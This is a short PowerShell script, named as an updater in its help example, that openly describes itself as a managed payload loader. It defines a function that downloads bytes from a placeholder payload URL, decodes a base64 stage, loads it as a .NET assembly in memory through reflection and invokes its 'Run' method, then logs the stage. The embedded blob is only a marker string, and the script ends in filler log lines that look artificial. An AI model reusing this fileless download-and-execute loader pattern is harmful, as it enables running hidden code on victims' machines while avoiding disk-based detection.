<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://contoso.com/payload.bin',
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$TimeoutSec = 150
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 150
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpxNTFubnZmOGw4')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($PayloadBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $TransferResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $PayloadBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Resolving configured target"
Write-Verbose "Preparing working directory"
Write-Verbose "Retry budget remaining"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Writing diagnostic marker"
$ProgressPreference = "SilentlyContinue"
Write-Verbose "stage marker 16 reached"
